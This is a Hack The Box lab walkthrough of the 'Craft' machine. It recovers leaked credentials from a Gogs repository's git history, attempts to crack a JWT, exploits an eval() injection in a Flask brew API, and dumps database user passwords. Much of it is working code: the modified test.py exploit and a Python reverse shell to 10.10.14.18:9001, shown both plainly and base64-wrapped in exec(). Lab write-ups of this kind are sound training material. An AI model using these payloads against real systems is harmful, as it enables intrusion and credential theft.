@@ -1,0 +1,1376 @@
+Craft - Hack The Box - Linux Medium
+
+3 Web Pages 
+
+Ports open: 22, 443, and 6022
+
+Will no interact with web page.
+
+We find a leaked hostname:
+https://api.craft.htb/api/
+
+We can append this to our hosts file so we can interact with that webpage
+Next we can go to that web page and examine the cert info
+
+We find a potential username:
+ admin@craft.htb
+Found from ssl cert.
+
+We also add https://gogs.craft.htb/
+
+GOing to the craft api it gives examples of using the api.
+We got /auth/login but it requires creds to execute.
+
+API is using http login authorization. We get unauthorized error.
+
+GOGS appears to be github repo, there is a gogs version
+Commands and Output:
+===================================================================================================================================
+
+© 2018 Gogs Version: 0.11.86.0130 Page: 4ms Template: 4ms
+English
+Website Go1.11.5
+===================================================================================================================================
+
+Searchsploit
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/craft]
+└──╼ $searchsploit gogs
+-------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                          |  Path
+-------------------------------------------------------------------------------------------------------- ---------------------------------
+Gogs - 'label' SQL Injection                                                                            | multiple/webapps/35237.txt
+Gogs - 'users'/'repos' '?q' SQL Injection                                                               | multiple/webapps/35238.txt
+-------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+Papers: No Results
+┌─[user@parrot-virtual]─[~/htb/craft]
+└──╼ $searchsploit -x multiple/webapps/35237.txt
+  Exploit: Gogs - 'label' SQL Injection
+      URL: https://www.exploit-db.com/exploits/35237
+     Path: /usr/share/exploitdb/exploits/multiple/webapps/35237.txt
+File Type: ASCII text, with CRLF line terminators
+
+
+
+┌─[user@parrot-virtual]─[~/htb/craft]
+└──╼ $searchsploit -x multiple/webapps/35238.txt
+  Exploit: Gogs - 'users'/'repos' '?q' SQL Injection
+      URL: https://www.exploit-db.com/exploits/35238
+     Path: /usr/share/exploitdb/exploits/multiple/webapps/35238.txt
+File Type: ASCII text, with CRLF line terminators
+
+===================================================================================================================================
+
+Both mentioned explits are from 2014 so most likely not vulnerable.
+
+Getting an admin user might allow us to get code execution via a POST commit hook.
+
+We can explore and go to https://gogs.craft.htb/explore/repos
+We find a list of users.
+Commands and Output:
+===================================================================================================================================
+ administrator
+Joined on Feb 07, 2019
+ebachman Erlich Bachman
+Joined on Feb 07, 2019
+dinesh Dinesh Chugtai
+Joined on Feb 07, 2019
+gilfoyle Bertram Gilfoyle
+Joined on Feb 07, 2019
+===================================================================================================================================
+
+We can also download the repo. We get an error but a quick google search exposes that you can bypass using the -c option.
+While alos spcifying ssl verify.
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/craft]
+└──╼ $git clone https://gogs.craft.htb/Craft/craft-api.git
+Cloning into 'craft-api'...
+fatal: unable to access 'https://gogs.craft.htb/Craft/craft-api.git/': server certificate verification failed. CAfile: none CRLfile: none
+
+┌─[✗]─[user@parrot-virtual]─[~/htb/craft]
+└──╼ $git -c http.sslVerify=false clone https://gogs.craft.htb/Craft/craft-api.git
+Cloning into 'craft-api'...
+remote: Enumerating objects: 45, done.
+remote: Counting objects: 100% (45/45), done.
+remote: Compressing objects: 100% (41/41), done.
+remote: Total 45 (delta 10), reused 0 (delta 0)
+Unpacking objects: 100% (45/45), 7.25 KiB | 927.00 KiB/s, done.
+===================================================================================================================================
+
+We look at the commit history and see the issues. Which adds bogus abv issues
+Commands and Output:
+===================================================================================================================================
+curl -H 'X-Craft-API-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsImV4cCI6MTU0OTM4NTI0Mn0.-wW1aJkLQDOE-GP5pQd3z_BJTe2Uo0jJ_mQ238P5Dqw' -H "Content-Type: application/json" -k -X POST https://api.craft.htb/api/brew/ --data '{"name":"bullshit","brewer":"bullshit", "style": "bullshit", "abv": "15.0")}'
+===================================================================================================================================
+
+JWT token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
+Commands and Output:
+===================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/craft]
+└──╼ $echo -n eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9 | base64 -d
+{"alg":"HS256","typ":"JWT"}┌─[user@parrot-virtual]─[~/htb/craft]
+└──╼ $echo -n eyJ1c2VyIjoidXNlciIsImV4cCI6MTU0OTM4NTI0Mn0 | base64 -d
+{"user":"user","exp":1549385242}base64: invalid input
+===================================================================================================================================
+
+We can look at the epoch time for the user expiration
+Commands and Output:
+===================================================================================================================================
+Assuming that this timestamp is in seconds:
+GMT: Tuesday, February 5, 2019 4:47:22 PM
+Your time zone: Tuesday, February 5, 2019 4:47:22 PM GMT+00:00
+Relative: 2 years ago
+===================================================================================================================================
+
+Looks like token has already expired, however we may be able to bruteforce the signing.
+"-wW1aJkLQDOE-GP5pQd3z_BJTe2Uo0jJ_mQ238P5Dqw"
+
+Pretty much signs the first 2 pieces of the token, if you get secret used to sign than you can forge your tokens.
+We take the entire token and place it in a file.
+Commands and Output:
+===================================================================================================================================
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsImV4cCI6MTU0OTM4NTI0Mn0
+===================================================================================================================================
+
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/craft]
+└──╼ $sudo hashcat -m 16500 craft.token /opt/SecLists/rockyou.txt --force
+===================================================================================================================================
+
+
+Bruteforcing returns nothing so we will apply a rules file. However this does not prove to be crackable.
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/craft/hashcat]
+└──╼ $sudo hashcat -m 16500 craft.token /opt/SecLists/rockyou.txt --force -r ./best64.rule 
+hashcat (v6.1.1) starting...
+
+You have enabled --force to bypass dangerous warnings and errors!
+This can hide serious problems and should only be done when debugging.
+Do not report hashcat issues encountered when using --force.
+OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+=============================================================================================================================
+* Device #1: pthread-Intel(R) Core(TM) i7-8750H CPU @ 2.20GHz, 2890/2954 MB (1024 MB allocatable), 4MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 77
+
+Applicable optimizers applied:
+* Zero-Byte
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+
+Watchdog: Hardware monitoring interface not found on your system.
+Watchdog: Temperature abort trigger disabled.
+
+Host memory required for this attack: 65 MB
+
+Dictionary cache hit:
+* Filename..: /opt/SecLists/rockyou.txt
+* Passwords.: 14344384
+* Bytes.....: 139921497
+* Keyspace..: 1104517568
+
+[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit => s
+
+Session..........: hashcat
+Status...........: Running
+Hash.Name........: JWT (JSON Web Token)
+Hash.Target......: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidX...8P5Dqw
+Time.Started.....: Wed May 12 15:56:54 2021, (38 secs)
+Time.Estimated...: Wed May 12 16:07:38 2021, (10 mins, 6 secs)
+Guess.Base.......: File (/opt/SecLists/rockyou.txt)
+Guess.Mod........: Rules (./best64.rule)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:  1714.7 kH/s (6.84ms) @ Accel:128 Loops:38 Thr:1 Vec:8
+Recovered........: 0/1 (0.00%) Digests
+Progress.........: 64398848/1104517568 (5.83%)
+Rejected.........: 0/64398848 (0.00%)
+Restore.Point....: 836096/14344384 (5.83%)
+Restore.Sub.#1...: Salt:0 Amplifier:38-76 Iteration:0-38
+Candidates.#1....: obligacman -> nussbu
+===================================================================================================================================
+
+JWT hashes crack fast kind of like ntlm.
+
+Can't replace JWT token. We can look at the commit used:
+https://gogs.craft.htb/Craft/craft-api/commit/c414b160578943acfe2e158e89409623f41da4c6
+FILE:
+craft_api/api/brew/endpoints/brew.py
+
+Dinesh is using "eval"
+Commands and Output:
+===================================================================================================================================
+         """
+         Creates a new brew entry.
+         """
+-        create_brew(request.json)
+-        return None, 201
++
++        # make sure the ABV value is sane.
++        if eval('%s > 1' % request.json['abv']):
++            return "ABV must be a decimal value less than 1.0", 400
++        else:
++            create_brew(request.json)
++            return None, 201
+
+ @ns.route('/<int:id>')
+ @api.response(404, 'Brew not found.')
+===================================================================================================================================
+
+Direct user input into EVAL means we have code execution.
+
+There is a closed issue by gilfoyle asking to add authentication
+
+Commands and Output:
+===================================================================================================================================
+
+Bertram Gilfoyle commented 2 years ago
+
+Please add authentication to the /api/brew endpoints, at least for actions which can modify the database.
+Erlich Bachman commented 2 years ago
+Owner
+
+Done. See commit: 4fd8dbf842
+===================================================================================================================================
+
+The commit goes to 404.
+
+We will analyze the git repo. With 2 tools.
+Installing gitleaks:
+https://github.com/zricethezav/gitleaks.git
+
+Commands and Output:
+===================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/craft]
+└──╼ $GO111MODULE=on go get github.com/zricethezav/gitleaks/v7
+go: downloading github.com/zricethezav/gitleaks/v7 v7.5.0
+go: downloading github.com/zricethezav/gitleaks v1.25.1
+go: github.com/zricethezav/gitleaks/v7 upgrade => v7.5.0
+go: downloading github.com/hako/durafmt v0.0.0-20191009132224-3f39dc1ed9f4
+go: downloading github.com/go-git/go-git/v5 v5.2.0
+go: downloading golang.org/x/sync v0.0.0-20201020160332-67f06af15bc9
+go: downloading github.com/jessevdk/go-flags v1.4.0
+go: downloading github.com/BurntSushi/toml v0.3.1
+go: downloading github.com/sergi/go-diff v1.1.0
+go: downloading github.com/sirupsen/logrus v1.4.2
+go: downloading golang.org/x/crypto v0.0.0-20200302210943-78000ba7a073
+go: downloading golang.org/x/net v0.0.0-20200301022130-244492dfa37a
+go: downloading github.com/mitchellh/go-homedir v1.1.0
+go: downloading github.com/go-git/go-billy/v5 v5.0.0
+go: downloading github.com/xanzy/ssh-agent v0.2.1
+go: downloading github.com/jbenet/go-context v0.0.0-20150711004518-d14ea06fba99
+go: downloading github.com/konsorten/go-windows-terminal-sequences v1.0.1
+go: downloading github.com/emirpasic/gods v1.12.0
+go: downloading github.com/imdario/mergo v0.3.9
+go: downloading github.com/kevinburke/ssh_config v0.0.0-20190725054713-01f96b0aa0cd
+go: downloading golang.org/x/sys v0.0.0-20200302150141-5c8b2ff67527
+go: downloading github.com/go-git/gcfg v1.5.0
+go: downloading gopkg.in/warnings.v0 v0.1.2
+===================================================================================================================================
+
+Will aslo install trufflehog with pip
+Commands and Output:
+===================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/craft/hashcat]
+└──╼ $pip3 install trufflehog
+===================================================================================================================================
+
+Commands and Output:
+===================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/craft/craft-api]
+└──╼ $gitleaks -v -p $(pwd)
+INFO[0000] opening /home/user/htb/craft/craft-api       
+INFO[0000] scan time: 19 milliseconds 899 microseconds  
+INFO[0000] commits scanned: 6                           
+INFO[0000] No leaks found
+===================================================================================================================================
+
+Commands and Output:
+===================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/craft/craft-api]
+└──╼ $trufflehog file://$(pwd)
+===================================================================================================================================
+
+We don't find anything so we will have to manually look at these manually.
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/craft/craft-api]
+└──╼ $git diff e55e12d800248c6bddf731462d0150f6e53c0802
+┌─[user@parrot-virtual]─[~/htb/craft/craft-api]
+└──╼ $git diff a2d28ed1554adddfcfb845879bfea09f976ab7c1
+diff --git a/dbtest.py b/dbtest.py
+new file mode 100755
+index 0000000..75dcc2f
+--- /dev/null
++++ b/dbtest.py
+@@ -0,0 +1,22 @@
++#!/usr/bin/env python
++
++import pymysql
++from craft_api import settings
++
++# test connection to mysql database
++
++connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST,
++                             user=settings.MYSQL_DATABASE_USER,
++                             password=settings.MYSQL_DATABASE_PASSWORD,
++                             db=settings.MYSQL_DATABASE_DB,
++                             cursorclass=pymysql.cursors.DictCursor)
++
++try: 
++    with connection.cursor() as cursor:
++        sql = "SELECT `id`, `brewer`, `name`, `abv` FROM `brew` LIMIT 1"
++        cursor.execute(sql)
++        result = cursor.fetchone()
++        print(result)
++
++finally:
+===================================================================================================================================
+
+dbtest.py allows raw sql commands to be ran - NEED creds.
+
+Time to look at the previous got commit:
+
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/craft/craft-api]
+└──╼ $git diff 10e3ba4f0a09c778d7cec673f28d410b73455a86
+diff --git a/dbtest.py b/dbtest.py
+new file mode 100755
+index 0000000..75dcc2f
+--- /dev/null
++++ b/dbtest.py
+@@ -0,0 +1,22 @@
++#!/usr/bin/env python
++
++import pymysql
++from craft_api import settings
++
++# test connection to mysql database
++
++connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST,
++                             user=settings.MYSQL_DATABASE_USER,
++                             password=settings.MYSQL_DATABASE_PASSWORD,
++                             db=settings.MYSQL_DATABASE_DB,
++                             cursorclass=pymysql.cursors.DictCursor)
++
++try: 
++    with connection.cursor() as cursor:
++        sql = "SELECT `id`, `brewer`, `name`, `abv` FROM `brew` LIMIT 1"
++        cursor.execute(sql)
++        result = cursor.fetchone()
++        print(result)
++
++finally:
++    connection.close()
+\ No newline at end of file
+diff --git a/tests/test.py b/tests/test.py
+index 40d5470..9b0e2e2 100644
+--- a/tests/test.py
++++ b/tests/test.py
+@@ -3,7 +3,7 @@
+ import requests
+ import json
+ 
+-response = requests.get('https://api.craft.htb/api/auth/login',  auth=('dinesh', '4aUh0A8PbVJxgd'), verify=False)
++response = requests.get('https://api.craft.htb/api/auth/login',  auth=('', ''), verify=False)
+ json_response = json.loads(response.text)
+ token =  json_response['token']
+
+===================================================================================================================================
+
+This time around we get creds for dinesh.
+auth=('dinesh', '4aUh0A8PbVJxgd')
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/craft/craft-api]
+└──╼ $git diff c414b160578943acfe2e158e89409623f41da4c6
+===================================================================================================================================
+
+Tests issue number 2 in the test.py script.
+
+We can now test the credential. With ssh
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/craft]
+└──╼ $ssh dinesh@10.10.10.110
+The authenticity of host '10.10.10.110 (10.10.10.110)' can't be established.
+ECDSA key fingerprint is SHA256:sFjoHo6ersU0f0BTzabUkFYHOr6hBzWsSK0MK5dwYAw.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.10.110' (ECDSA) to the list of known hosts.
+
+
+  .   *   ..  . *  *
+*  * @()Ooc()*   o  .
+    (Q@*0CG*O()  ___
+   |\_________/|/ _ \
+   |  |  |  |  | / | |
+   |  |  |  |  | | | |
+   |  |  |  |  | | | |
+   |  |  |  |  | | | |
+   |  |  |  |  | | | |
+   |  |  |  |  | \_| |
+   |  |  |  |  |\___/
+   |\_|__|__|_/|
+    \_________/
+
+
+
+Password: 
+Password: 
+Password: 
+dinesh@10.10.10.110: Permission denied (publickey,keyboard-interactive).
+===================================================================================================================================
+
+That does not work, but there was a high port running ssh we can try those creds there.
+Commands and Output:
+===================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/craft]
+└──╼ $ssh dinesh@10.10.10.110 -p 6022
+The authenticity of host '[10.10.10.110]:6022 ([10.10.10.110]:6022)' can't be established.
+RSA key fingerprint is SHA256:JL2e7zVkLrtwos3PHziXPRckBZRJ7BKPbuMuLpDn23s.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[10.10.10.110]:6022' (RSA) to the list of known hosts.
+dinesh@10.10.10.110: Permission denied (publickey).
+===================================================================================================================================
+
+Only public keys are allowed, so we can try the creds on gogs.
+dinesh 4aUh0A8PbVJxgd
+
+We are able to login but he is not an admin in gogs. We could potentially add an ssh key and use it as the server as a pivot box.
+We create our own key but can't seem to login either way
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/craft/ssh]
+└──╼ $ssh-keygen -t rsa -f craft
+Generating public/private rsa key pair.
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in craft
+Your public key has been saved in craft.pub
+The key fingerprint is:
+SHA256:gOo1CJyOzvlf/iHYGX4r/80SW6kPcVGhVaCPShV/zgE user@parrot-virtual
+The key's randomart image is:
++---[RSA 3072]----+
+|            .E.=+|
+|. .  .       +=  |
+|.o  . .     oo...|
+|o. o   .   . o.+.|
+|..o o  .S ....o o|
+|o... .+ o. ooo   |
+| +.  . * o..=    |
+|  .   o.o o++    |
+|   ... .++..o+   |
++----[SHA256]-----+
+┌─[user@parrot-virtual]─[~/htb/craft/ssh]
+└──╼ $
+┌─[user@parrot-virtual]─[~/htb/craft/ssh]
+└──╼ $ls
+craft  craft.pub
+┌─[user@parrot-virtual]─[~/htb/craft/ssh]
+└──╼ $cat craft.pub |c
+┌─[user@parrot-virtual]─[~/htb/craft/ssh]
+└──╼ $ls
+craft  craft.pub
+┌─[user@parrot-virtual]─[~/htb/craft/ssh]
+└──╼ $chmod 600 craft*
+┌─[user@parrot-virtual]─[~/htb/craft/ssh]
+└──╼ $
+┌─[user@parrot-virtual]─[~/htb/craft/ssh]
+└──╼ $ls
+craft  craft.pub
+┌─[user@parrot-virtual]─[~/htb/craft/ssh]
+└──╼ $ssh -p 6022 disnesh@10.10.10.110 -i craft
+Connection to 10.10.10.110 closed.
+
+===================================================================================================================================
+
+TO get out of the stuck ssh connection use "~."
+Alternatively the the thing we can do is forward port using ssh. Port forwarding.
+Commands and Output:
+===================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/craft/ssh]
+└──╼ $ssh -L 3306:localhost:3306 -p 6022 disnesh@10.10.10.110 -i craft
+
+===================================================================================================================================
+
+However we don't have any of the internal ips to do this successfully. Redish video demonstrates forwarding.
+
+Only thing left to do is go back to the beginning and do test.py on the api webpage in auth login
+dinesh 4aUh0A8PbVJxgd
+
+When we execute it again it runs successfully with the creds. On the api page.
+
+If for some reason you cannot run it on te api webpage, you can try it on using the git repo
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/craft/craft-api/tests]
+└──╼ $python3 test.py 
+/usr/lib/python3/dist-packages/urllib3/connectionpool.py:1015: InsecureRequestWarning: Unverified HTTPS request is being made to host 'api.craft.htb'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings
+  warnings.warn(
+/usr/lib/python3/dist-packages/urllib3/connectionpool.py:1015: InsecureRequestWarning: Unverified HTTPS request is being made to host 'api.craft.htb'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings
+  warnings.warn(
+{"message":"Token is valid!"}
+
+Create bogus ABV brew
+/usr/lib/python3/dist-packages/urllib3/connectionpool.py:1015: InsecureRequestWarning: Unverified HTTPS request is being made to host 'api.craft.htb'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings
+  warnings.warn(
+"ABV must be a decimal value less than 1.0"
+
+Create real ABV brew
+/usr/lib/python3/dist-packages/urllib3/connectionpool.py:1015: InsecureRequestWarning: Unverified HTTPS request is being made to host 'api.craft.htb'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings
+  warnings.warn(
+null
+===================================================================================================================================
+
+You can get rid of the warnings by adding the following to the the top of test.py
+requests.packages.urllib3.disable_warnings()
+
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/craft/craft-api/tests]
+└──╼ $python3 test.py 
+{"message":"Token is valid!"}
+
+Create bogus ABV brew
+"ABV must be a decimal value less than 1.0"
+
+Create real ABV brew
+null
+===================================================================================================================================
+
+We will create a command in one line cause of the eval vulnerability, which was in the abv value.
+Commands and Output:
+===================================================================================================================================
+#!/usr/bin/env python
+
+import requests
+import json
+
+requests.packages.urllib3.disable_warnings()
+
+cmd = '__import__("os").system("ping -c 1 10.10.14.18")'
+
+#response = requests.get('https://api.craft.htb/api/auth/login',  auth=('', ''), verify=False)
+response = requests.get('https://api.craft.htb/api/auth/login',  auth=('dinesh', '4aUh0A8PbVJxgd'), verify=False)
+json_response = json.loads(response.text)
+token =  json_response['token']
+
+headers = { 'X-Craft-API-Token': token, 'Content-Type': 'application/json'  }
+
+# make sure token is valid
+response = requests.get('https://api.craft.htb/api/auth/check', headers=headers, verify=False)
+print(response.text)
+
+# create a sample brew with bogus ABV... should fail.
+
+print("Create bogus ABV brew")
+brew_dict = {}
+#brew_dict['abv'] = '15.0'
+brew_dict['abv'] = cmd
+brew_dict['name'] = 'bullshit'
+brew_dict['brewer'] = 'bullshit'
+brew_dict['style'] = 'bullshit'
+
+json_data = json.dumps(brew_dict)
+response = requests.post('https://api.craft.htb/api/brew/', headers=headers, data=json_data, verify=False)
+print(response.text)
+
+
+# create a sample brew with real ABV... should succeed.
+print("Create real ABV brew")
+brew_dict = {}
+brew_dict['abv'] = '0.15'
+brew_dict['name'] = 'bullshit'
+brew_dict['brewer'] = 'bullshit'
+brew_dict['style'] = 'bullshit'
+
+json_data = json.dumps(brew_dict)
+response = requests.post('https://api.craft.htb/api/brew/', headers=headers, data=json_data, verify=False)
+print(response.text)
+===================================================================================================================================
+
+Lines added 
+Commands and Output:
+===================================================================================================================================
+..
+..
+cmd = '__import__("os").system("ping -c 1 10.10.14.18")'
+..
+..
+brew_dict['abv'] = cmd
+
+..
+..
+..
+..
+
+┌─[✗]─[user@parrot-virtual]─[~/htb/craft]
+└──╼ $sudo tcpdump -i tun0 icmp
+[sudo] password for user: 
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+16:51:40.948770 IP craft.htb > 10.10.14.18: ICMP echo request, id 13568, seq 0, length 64
+16:51:40.948789 IP 10.10.14.18 > craft.htb: ICMP echo reply, id 13568, seq 0, length 64
+
+===================================================================================================================================
+
+We can get code execution, let's get a reverse shell
+
+However our line does not execute succfully since ur code is not one line which is what eval wants. In the abv variable.
+Commands and Output:
+===================================================================================================================================
+cmd = 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.18",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+===================================================================================================================================
+
+So what we can do it is make the code into one line by base64 encoding the shell code payload as follows.
+Commands and Output:
+===================================================================================================================================
+from base64 import b64encode
+
+sc = """import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("10.10.14.18",9001))
+os.dup2(s.fileno(),0) 
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call(["/bin/sh","-i"])
+"""
+print(sc)
+
+print(b64encode(sc.encode()))
+
+..
+..
+..
+
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("10.10.14.18",9001))
+os.dup2(s.fileno(),0) 
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call(["/bin/sh","-i"])
+
+b'aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zCnM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pCnMuY29ubmVjdCgoIjEwLjEwLjE0LjE4Iiw5MDAxKSkKb3MuZHVwMihzLmZpbGVubygpLDApIApvcy5kdXAyKHMuZmlsZW5vKCksMSkKb3MuZHVwMihzLmZpbGVubygpLDIpCnA9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pCg=='
+
+===================================================================================================================================
+
+We can now take the base64 encoded string and run it using the test.py script which runs exec on the whole string and runs the
+code on the remote server.
+Commands and Output:
+===================================================================================================================================
+..
+..
+..
+
+cmd = 'exec(__import__("base64").b64decode("aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zCnM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pCnMuY29ubmVjdCgoIjEwLjEwLjE0LjE4Iiw5MDAxKSkKb3MuZHVwMihzLmZpbGVubygpLDApIApvcy5kdXAyKHMuZmlsZW5vKCksMSkKb3MuZHVwMihzLmZpbGVubygpLDIpCnA9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pCg=="))'
+
+response = requests.get('https://api.craft.htb/api/auth/login',  auth=('dinesh', '4aUh0A8PbVJxgd'), verify=False)
+
+..
+..
+..
+
+print("Create bogus ABV brew")
+brew_dict = {}
+brew_dict['abv'] = cmd
+brew_dict['name'] = 'bullshit'
+brew_dict['brewer'] = 'bullshit'
+brew_dict['style'] = 'bullshit'
+
+===================================================================================================================================
+
+Before we run it we setup our netcat listener 
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/craft/craft-api/tests]
+└──╼ $python3 test.py 
+{"message":"Token is valid!"}
+
+Create bogus ABV brew
+
+..
+..
+..
+
+┌─[user@parrot-virtual]─[~/htb/craft/craft-api/tests]
+└──╼ $nc -lnvp 9001
+listening on [any] 9001 ...
+connect to [10.10.14.18] from (UNKNOWN) [10.10.10.110] 48462
+/bin/sh: can't access tty; job control turned off
+/opt/app # ls
+app.py
+craft_api
+dbtest.py
+tests
+/opt/app # whoami
+root
+
+===================================================================================================================================
+
+The shell is not actually progressing forward, we make sure that webserver does not hang up.
+The shell actually prints stdout of webserver just makes sure to get a "real" shell.
+Commands and Output:
+===================================================================================================================================
+/opt/app # ls
+app.py     craft_api  dbtest.py  tests
+/opt/app # cat dbtest.py 
+#!/usr/bin/env python
+
+import pymysql
+from craft_api import settings
+
+# test connection to mysql database
+
+connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST,
+                             user=settings.MYSQL_DATABASE_USER,
+                             password=settings.MYSQL_DATABASE_PASSWORD,
+                             db=settings.MYSQL_DATABASE_DB,
+                             cursorclass=pymysql.cursors.DictCursor)
+
+try: 
+    with connection.cursor() as cursor:
+        sql = "SELECT `id`, `brewer`, `name`, `abv` FROM `brew` LIMIT 1"
+        cursor.execute(sql)
+        result = cursor.fetchone()
+        print(result)
+
+finally:
+    connection.close()
+===================================================================================================================================
+
+DBtest.py let's us run raw sql commands but creds are needed.
+Commands and Output:
+===================================================================================================================================
+/opt/app/craft_api # cat settings.py 
+# Flask settings
+FLASK_SERVER_NAME = 'api.craft.htb'
+FLASK_DEBUG = False  # Do not use debug mode in production
+
+# Flask-Restplus settings
+RESTPLUS_SWAGGER_UI_DOC_EXPANSION = 'list'
+RESTPLUS_VALIDATE = True
+RESTPLUS_MASK_SWAGGER = False
+RESTPLUS_ERROR_404_HELP = False
+CRAFT_API_SECRET = 'hz66OCkDtv8G6D'
+
+# database
+MYSQL_DATABASE_USER = 'craft'
+MYSQL_DATABASE_PASSWORD = 'qLGockJ6G2J75O'
+MYSQL_DATABASE_DB = 'craft'
+MYSQL_DATABASE_HOST = 'db'
+SQLALCHEMY_TRACK_MODIFICATIONS = False
+===================================================================================================================================
+
+We could try a tunnel into the database or edit the script, editing the script is faster.
+
+So we modify /opt/app/db2.py which is a copy dbtest.py
+Commands and Output:
+===================================================================================================================================
+
+try: 
+    with connection.cursor() as cursor:
+        sql = "show tables"
+        cursor.execute(sql)
+..
+..
+..
+/opt/app # python3 db2.py 
+{'Tables_in_craft': 'brew'}
+
+===================================================================================================================================
+
+
+We again modify it again to fetch all tables
+Commands and Output:
+===================================================================================================================================
+
+
+try: 
+    with connection.cursor() as cursor:
+        sql = "show tables"
+        cursor.execute(sql)
+        result = cursor.fetchall()
+        for i in result:
+            print(i)
+        print(result)
+
+..
+..
+..
+
+/opt/app # python3 db2.py 
+{'Tables_in_craft': 'brew'}
+{'Tables_in_craft': 'user'}
+[{'Tables_in_craft': 'brew'}, {'Tables_in_craft': 'user'}]
+
+===================================================================================================================================
+
+By querying the database with the script we are able to gain all the user sql creds usernames and password.
+Commands and Output:
+===================================================================================================================================
+..
+..
+..
+
+try: 
+    with connection.cursor() as cursor:
+        #sql = "show tables"
+        sql = "select * from user"
+        cursor.execute(sql)
+        result = cursor.fetchall()
+        for i in result:
+            print(i)
+        print(result)
+..
+..
+..
+
+/opt/app # python3 db2.py 
+{'id': 1, 'username': 'dinesh', 'password': '4aUh0A8PbVJxgd'}
+{'id': 4, 'username': 'ebachman', 'password': 'llJ77D8QFkLPQB'}
+{'id': 5, 'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'}
+[{'id': 1, 'username': 'dinesh', 'password': '4aUh0A8PbVJxgd'}, {'id': 4, 'username': 'ebachman', 'password': 'llJ77D8QFkLPQB'}, {'id': 5, 'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'}]
+===================================================================================================================================
+
+Let's try loggin in gogs with the usernames and passwords.
+If we look at settings we could obtain the api secret pass
+Commands and Output:
+===================================================================================================================================
+/opt/app/craft_api # cat settings.py 
+# Flask settings
+FLASK_SERVER_NAME = 'api.craft.htb'
+FLASK_DEBUG = False  # Do not use debug mode in production
+
+# Flask-Restplus settings
+RESTPLUS_SWAGGER_UI_DOC_EXPANSION = 'list'
+RESTPLUS_VALIDATE = True
+RESTPLUS_MASK_SWAGGER = False
